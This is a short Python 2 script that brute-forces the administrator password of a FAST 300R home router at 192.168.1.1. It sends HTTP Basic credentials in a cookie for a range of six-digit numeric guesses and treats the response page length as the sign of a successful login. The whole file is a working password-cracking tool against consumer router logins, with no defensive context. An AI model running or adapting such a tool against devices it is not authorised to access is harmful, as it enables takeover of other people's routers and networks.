#!/usr/bin/env python
#coding:utf8
#
# Crack FAST 300R Router Admin's password.
# administrator address: 192.168.1.1
#
import urllib2,base64
host_address = '192.168.1.1'

def crack(str_pwd):
	
	#str_pwd = '123456'
	cookies = 'Authorization=Basic%20'+base64.b64encode('admin:'+str_pwd)
	
	url = r'http://'+host_address
	
	data = ''
	headers = {'Host':host_address,'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) ','Cookie': cookies,'Cache-Control':'max-age=0','Connection':'keep-alive'}

	req = urllib2.Request(url,data,headers)
	r = urllib2.urlopen(req)
	html = r.read()
	print len(html)

	if len(html) < 3000:	#len(html)=2086
		#print 'Login Success!'
		return 1
	elif len(html) > 7000:	#len(html)=7245
		#print 'Login Error!'
		return 0
	else:
		print 'Error'
		return 0

if __name__ == '__main__':

	passwd = ''
	count = 0
	
	# crack 6-digit password
	for i in range(123440,123467,1):
		print 'Checking %5d' % count+':\t'+str(i)
		if(crack(str(i))):
			passwd = str(i)
			print chr(7)+'Found password: '+passwd
			break
		count += 1
		
	
	print 'Done!'
	